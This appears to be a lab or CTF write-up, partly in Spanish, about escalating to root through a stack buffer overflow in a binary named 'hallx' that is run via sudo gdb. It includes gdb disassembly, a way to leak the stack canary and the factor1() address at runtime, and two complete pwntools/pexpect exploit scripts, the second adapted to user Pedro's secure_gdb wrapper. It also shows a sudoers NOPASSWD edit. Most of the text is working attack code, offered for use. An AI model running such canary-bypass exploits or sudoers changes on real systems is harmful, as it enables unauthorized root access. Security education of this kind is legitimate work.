![image](https://github.com/user-attachments/assets/a798b483-b50b-4dc7-8d27-adeaabcee8a2)

The program has all protections active, so it would be necessary to extract the memory addresses at runtime to be able to exploit the Bof, apart from the need to bypass the canary protection. Now we will debug the program with privileges and analyze how to extract the necessary information and locate the memory address where the canary is located.


```bash
sudo gdb -q ./hallx
```
```bash
Reading symbols from ./hallx...
(No debugging symbols found in ./hallx)
(gdb) break main
Breakpoint 1 at 0x3762
(gdb) r
Starting program: /home/darks/Desktop/program/hallx 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Breakpoint 1, 0x0000555555557762 in main ()
(gdb) set pagination off
(gdb) disassemble factor2
Dump of assembler code for function factor2:
   0x0000555555557605 <+0>:	push   %rbp
   0x0000555555557606 <+1>:	mov    %rsp,%rbp
   0x0000555555557609 <+4>:	sub    $0x60,%rsp
   0x000055555555760d <+8>:	mov    %fs:0x28,%rax
   0x0000555555557616 <+17>:	mov    %rax,-0x8(%rbp)
   0x000055555555761a <+21>:	xor    %eax,%eax
   0x000055555555761c <+23>:	lea    0xff1(%rip),%rax        # 0x555555558614
   0x0000555555557623 <+30>:	mov    %rax,%rdi
   0x0000555555557626 <+33>:	mov    $0x0,%eax
   0x000055555555762b <+38>:	call   0x555555556030 <printf@plt>
   0x0000555555557630 <+43>:	mov    0x2b49(%rip),%rdx        # 0x55555555a180 <stdin@GLIBC_2.2.5>
   0x0000555555557637 <+50>:	lea    -0x50(%rbp),%rax
   0x000055555555763b <+54>:	mov    $0x80,%esi
   0x0000555555557640 <+59>:	mov    %rax,%rdi
   0x0000555555557643 <+62>:	call   0x555555556220 <fgets@plt>
   0x0000555555557648 <+67>:	lea    -0x50(%rbp),%rax
   0x000055555555764c <+71>:	lea    0xfd7(%rip),%rdx        # 0x55555555862a
   0x0000555555557653 <+78>:	mov    %rdx,%rsi
   0x0000555555557656 <+81>:	mov    %rax,%rdi
   0x0000555555557659 <+84>:	call   0x5555555561f0 <strcmp@plt>
   0x000055555555765e <+89>:	test   %eax,%eax
   0x0000555555557660 <+91>:	je     0x5555555576a6 <factor2+161>
   0x0000555555557662 <+93>:	lea    -0x50(%rbp),%rax
   0x0000555555557666 <+97>:	lea    0xfc5(%rip),%rdx        # 0x555555558632
   0x000055555555766d <+104>:	mov    %rdx,%rsi
   0x0000555555557670 <+107>:	mov    %rax,%rdi
   0x0000555555557673 <+110>:	call   0x5555555561f0 <strcmp@plt>
   0x0000555555557678 <+115>:	test   %eax,%eax
   0x000055555555767a <+117>:	je     0x5555555576a6 <factor2+161>
   0x000055555555767c <+119>:	lea    0xfbd(%rip),%rax        # 0x555555558640
   0x0000555555557683 <+126>:	mov    %rax,%rdi
   0x0000555555557686 <+129>:	call   0x555555556210 <puts@plt>
   0x000055555555768b <+134>:	lea    -0x50(%rbp),%rax
   0x000055555555768f <+138>:	lea    0xfea(%rip),%rdx        # 0x555555558680
   0x0000555555557696 <+145>:	mov    %rdx,%rsi
   0x0000555555557699 <+148>:	mov    %rax,%rdi
   0x000055555555769c <+151>:	call   0x55555555748d <log_event>
   0x00005555555576a1 <+156>:	jmp    0x555555557748 <factor2+323>
   0x00005555555576a6 <+161>:	lea    0xff3(%rip),%rax        # 0x5555555586a0
   0x00005555555576ad <+168>:	mov    %rax,%rdi
   0x00005555555576b0 <+171>:	mov    $0x0,%eax
   0x00005555555576b5 <+176>:	call   0x555555556030 <printf@plt>
   0x00005555555576ba <+181>:	lea    -0x5a(%rbp),%rax
   0x00005555555576be <+185>:	mov    %rax,%rsi
   0x00005555555576c1 <+188>:	lea    0x100f(%rip),%rax        # 0x5555555586d7
   0x00005555555576c8 <+195>:	mov    %rax,%rdi
   0x00005555555576cb <+198>:	mov    $0x0,%eax
   0x00005555555576d0 <+203>:	call   0x555555556190 <__isoc99_scanf@plt>
   0x00005555555576d5 <+208>:	lea    -0x5a(%rbp),%rax
   0x00005555555576d9 <+212>:	lea    0xffb(%rip),%rdx        # 0x5555555586db
   0x00005555555576e0 <+219>:	mov    %rdx,%rsi
   0x00005555555576e3 <+222>:	mov    %rax,%rdi
   0x00005555555576e6 <+225>:	call   0x5555555561f0 <strcmp@plt>
   0x00005555555576eb <+230>:	test   %eax,%eax
   0x00005555555576ed <+232>:	je     0x55555555771a <factor2+277>
   0x00005555555576ef <+234>:	lea    -0x5a(%rbp),%rax
   0x00005555555576f3 <+238>:	lea    0xfe9(%rip),%rdx        # 0x5555555586e3
   0x00005555555576fa <+245>:	mov    %rdx,%rsi
   0x00005555555576fd <+248>:	mov    %rax,%rdi
   0x0000555555557700 <+251>:	call   0x5555555561f0 <strcmp@plt>
   0x0000555555557705 <+256>:	test   %eax,%eax
   0x0000555555557707 <+258>:	je     0x55555555771a <factor2+277>
   0x0000555555557709 <+260>:	lea    0xfda(%rip),%rax        # 0x5555555586ea
   0x0000555555557710 <+267>:	mov    %rax,%rdi
   0x0000555555557713 <+270>:	call   0x555555556210 <puts@plt>
   0x0000555555557718 <+275>:	jmp    0x555555557748 <factor2+323>
   0x000055555555771a <+277>:	lea    -0x5a(%rbp),%rdx
   0x000055555555771e <+281>:	lea    -0x50(%rbp),%rax
   0x0000555555557722 <+285>:	mov    %rdx,%rsi
   0x0000555555557725 <+288>:	mov    %rax,%rdi
   0x0000555555557728 <+291>:	call   0x555555557549 <log_register>
   0x000055555555772d <+296>:	lea    -0x5a(%rbp),%rax
   0x0000555555557731 <+300>:	mov    %rax,%rsi
   0x0000555555557734 <+303>:	lea    0xfc1(%rip),%rax        # 0x5555555586fc
   0x000055555555773b <+310>:	mov    %rax,%rdi
   0x000055555555773e <+313>:	mov    $0x0,%eax
   0x0000555555557743 <+318>:	call   0x555555556030 <printf@plt>
   0x0000555555557748 <+323>:	mov    -0x8(%rbp),%rax
   0x000055555555774c <+327>:	sub    %fs:0x28,%rax
   0x0000555555557755 <+336>:	je     0x55555555775c <factor2+343>
   0x0000555555557757 <+338>:	call   0x555555556180 <__stack_chk_fail@plt>
   0x000055555555775c <+343>:	leave
   0x000055555555775d <+344>:	ret
End of assembler dump
```

The first thing is to locate the canary in memory and for this we first place a breakpoint in main() and run the program with the objective of randomizing the memory addresses, when it stops in main() we disassemble the factor2 function to locate the canary.

```bash
 0x0000555555557616 <+17>:	mov    %rax,-0x8(%rbp)
```

We locate the canary located at rbp-0x8, Now we need to locate ourselves after the memory address 0x0000555555557616, so we set a breakpoint on a following instruction, for example at: 0x0000555555557626.

```bash
break *0x0000555555557626
```
```bash
continue
```
```bash
x/1gx $rbp-0x8
```

![image](https://github.com/user-attachments/assets/466446cb-4dcb-483c-a02b-cf1b5c0c5eae)

Here we have extracted the canary, The other thing we need is to extract the address of the malicious function factor1()

```bash
p factor1
```

![image](https://github.com/user-attachments/assets/18b6615a-4596-4846-acab-1ec06c228ac6)

Now, using an exploit, we will automate the extraction of this data at runtime.

```python
import pexpect
import re
import struct
from pwn import *

def atack():

    binary = ELF("/home/darks/Desktop/program/hallx")
    binary_path = "/home/darks/Desktop/program/hallx"
    gdb_process = pexpect.spawn(f"sudo gdb {binary_path}", timeout=10, maxread=10000, searchwindowsize=100)
    gdb_process.expect("(gdb)")
    gdb_process.sendline("set disassembly-flavor intel")
    gdb_process.expect("(gdb)")
    gdb_process.sendline("set pagination off")
    gdb_process.expect("(gdb)")
    gdb_process.sendline("set style enabled off")
    gdb_process.expect("(gdb)")
    gdb_process.sendline("break main")
    gdb_process.expect("(gdb)")
    #gdb_process.sendline("break factor1")
    #gdb_process.expect("(gdb)")
    gdb_process.sendline("run")

    # Extracting address from factor1() function
    gdb_process.expect("(gdb)")
    gdb_process.sendline("p factor1")
    gdb_process.expect_exact("(gdb)", timeout=10)
    address_factor1 = gdb_process.before.decode('utf-8')
    match = re.search(r'0x[0-9a-f]+', address_factor1)
    if match:
       address_factor1_str = match.group(0)  # Extraer la dirección en formato hexadecimal
       address_factor1_int = int(address_factor1_str, 16)
       address_factor1_le = p64(address_factor1_int) # direccion de factor1 en formato little-endian lista para el payload
       gdb_process.sendline(" ") # prepara gdb para recibir el siguiente comando!
    else:
       print("No se pudo extraer la dirección de factor1().")
       exit(1)

    # We extract the memory address that will allow us to create a breakpoint to capture the canary already loaded in the stack.
    gdb_process.expect("(gdb)")
    gdb_process.sendline("disas factor2")
    gdb_process.expect_exact("(gdb)", timeout=10)
    address_factor2 = gdb_process.before.decode('utf-8')
    lines = address_factor2.splitlines()
    memory_addresses = [line.split()[0] for line in lines if '<+' in line]
    if len(memory_addresses) >= 7:
       seventh_memory_address = memory_addresses[6]
       gdb_process.sendline(" ")
       gdb_process.expect("(gdb)")
       gdb_process.sendline(f"break *{seventh_memory_address}")
       gdb_process.expect("(gdb)")
       gdb_process.sendline("continue")
    else:
       print("No hay suficientes direcciones de memoria en la salida")

    # we extract the canary
    gdb_process.expect("(gdb)")
    gdb_process.sendline("x/1gx $rbp-0x8")
    gdb_process.expect_exact("(gdb)", timeout=10)
    output_canary = gdb_process.before.decode('utf-8')
    canary_value = output_canary.split(':')[1].strip().split()[0]
    output_canary_int = int(canary_value, 16)
    output_canary_le = struct.pack('<Q', output_canary_int) # canary listo en formato little-endian para el payload
    gdb_process.sendline(" ")
    gdb_process.expect("(gdb)")
    gdb_process.sendline("continue")

#    test code
#    gdb_process.expect("(gdb)")
#    gdb_process.sendline("disas factor2")
#    gdb_process.expect_exact("(gdb)", timeout=10)
#    address_breakpoint = gdb_process.before.decode('utf-8')
#    lines = address_breakpoint.splitlines()
#    memory_addresses_breakpoint = [line.split()[0] for line in lines if '<+' in line]
#    if len(memory_addresses_breakpoint) >= 20:
#       memory_address_bp = memory_addresses_breakpoint[19]
#       gdb_process.sendline(" ")
#       gdb_process.expect("(gdb)")
#       gdb_process.sendline(f"break *{memory_address_bp}")
#       gdb_process.expect("(gdb)")
#       gdb_process.sendline("continue")
#    else:
#       print("No hay suficientes direcciones de memoria en la salida")

    # construction of the payload
    buffer_size = 72 # offset before overwriting the canary
    buffer_fil = b'S' *buffer_size
    padding = b'A' *8 # padding to align the stack
    #rip = b'P' *8

    payload = flat(
    buffer_fil,
    output_canary_le,
    padding,
    address_factor1_le
    )
    # sending the payload
    gdb_process.expect("Introduce tu nombre: ")
    gdb_process.sendline(payload)
    #gdb_process.expect("(gdb)")
    gdb_process.sendline("continue")
    gdb_process.interact()
    gdb_process.send(b"quit")
    gdb_process.close()

if __name__ == '__main__':
    atack()
```

Now I configure my environment to be able to run gdb as root without asking me for a password.

```bash
echo "darks ALL=(root) NOPASSWD: /usr/bin/gdb" >> /etc/sudoers
```

Note: This configuration is on my local machine where I am developing and testing the exploit, this configuration must then be reverted.

Once the environment is configured, I test the exploit.

https://github.com/user-attachments/assets/7525f3f8-3d16-4af3-acb7-85b4952be9fd

The exploit worked correctly on my machine, now it must be modified to run in Pedro's environment using the /usr/local/bin/secure_gdb script.

The final exploit would look like this:

exploit
```python
import pexpect
import re
import struct
from pwn import *

def atack():

    binary = ELF("/home/pedro/hallx")
    binary_path = "/home/pedro/hallx"
    secure_gdb = "/usr/local/bin/secure_gdb"
    gdb_process = pexpect.spawn(f"sudo {secure_gdb} {binary_path}", timeout=10, maxread=10000, searchwindowsize=100)
    gdb_process.expect("(gdb)")
    gdb_process.sendline("set disassembly-flavor intel")
    gdb_process.expect("(gdb)")
    gdb_process.sendline("set pagination off")
    gdb_process.expect("(gdb)")
    gdb_process.sendline("set style enabled off")
    gdb_process.expect("(gdb)")
    gdb_process.sendline("break main")
    gdb_process.expect("(gdb)")
    #gdb_process.sendline("break factor1")
    #gdb_process.expect("(gdb)")
    gdb_process.sendline("run")

    # Extracting address from factor1() function
    gdb_process.expect("(gdb)")
    gdb_process.sendline("p factor1")
    gdb_process.expect_exact("(gdb)", timeout=10)
    address_factor1 = gdb_process.before.decode('utf-8')
    match = re.search(r'0x[0-9a-f]+', address_factor1)
    if match:
       address_factor1_str = match.group(0)  # Extraer la dirección en formato hexadecimal
       address_factor1_int = int(address_factor1_str, 16)
       address_factor1_le = p64(address_factor1_int) # direccion de factor1 en formato little-endian lista para el payload
       gdb_process.sendline(" ") # prepara gdb para recibir el siguiente comando!
    else:
       print("No se pudo extraer la dirección de factor1().")
       exit(1)

    # We extract the memory address that will allow us to create a breakpoint to capture the canary already loaded in the stack.
    gdb_process.expect("(gdb)")
    gdb_process.sendline("disas factor2")
    gdb_process.expect_exact("(gdb)", timeout=10)
    address_factor2 = gdb_process.before.decode('utf-8')
    lines = address_factor2.splitlines()
    memory_addresses = [line.split()[0] for line in lines if '<+' in line]
    if len(memory_addresses) >= 7:
       seventh_memory_address = memory_addresses[6]
       gdb_process.sendline(" ")
       gdb_process.expect("(gdb)")
       gdb_process.sendline(f"break *{seventh_memory_address}")
       gdb_process.expect("(gdb)")
       gdb_process.sendline("continue")
    else:
       print("No hay suficientes direcciones de memoria en la salida")

    # we extract the canary
    gdb_process.expect("(gdb)")
    gdb_process.sendline("x/1gx $rbp-0x8")
    gdb_process.expect_exact("(gdb)", timeout=10)
    output_canary = gdb_process.before.decode('utf-8')
    canary_value = output_canary.split(':')[1].strip().split()[0]
    output_canary_int = int(canary_value, 16)
    output_canary_le = struct.pack('<Q', output_canary_int) # canary listo en formato little-endian para el payload
    gdb_process.sendline(" ")
    gdb_process.expect("(gdb)")
    gdb_process.sendline("continue")

#    test code
#    gdb_process.expect("(gdb)")
#    gdb_process.sendline("disas factor2")
#    gdb_process.expect_exact("(gdb)", timeout=10)
#    address_breakpoint = gdb_process.before.decode('utf-8')
#    lines = address_breakpoint.splitlines()
#    memory_addresses_breakpoint = [line.split()[0] for line in lines if '<+' in line]
#    if len(memory_addresses_breakpoint) >= 20:
#       memory_address_bp = memory_addresses_breakpoint[19]
#       gdb_process.sendline(" ")
#       gdb_process.expect("(gdb)")
#       gdb_process.sendline(f"break *{memory_address_bp}")
#       gdb_process.expect("(gdb)")
#       gdb_process.sendline("continue")
#    else:
#       print("No hay suficientes direcciones de memoria en la salida")

    # construction of the payload
    buffer_size = 72 # offset before overwriting the canary
    buffer_fil = b'S' *buffer_size
    padding = b'A' *8 # padding to align the stack
    #rip = b'P' *8

    payload = flat(
    buffer_fil,
    output_canary_le,
    padding,
    address_factor1_le
    )
    # sending the payload
    gdb_process.expect("Introduce tu nombre: ")
    gdb_process.sendline(payload)
    #gdb_process.expect("(gdb)")
    gdb_process.sendline("continue")
    gdb_process.interact()
    gdb_process.send(b"quit")
    gdb_process.close()

if __name__ == '__main__':
    atack()
```
We move the exploit to Pedro's directory, then we request permissions from the administrator again via email and execute the exploit.

https://github.com/user-attachments/assets/9aea40ac-a48d-4021-bf74-49efbf0bd77c

The exploit worked by getting the bash as root

![image](https://github.com/user-attachments/assets/4c8256bd-24f3-4403-9746-ac8554d760a5)






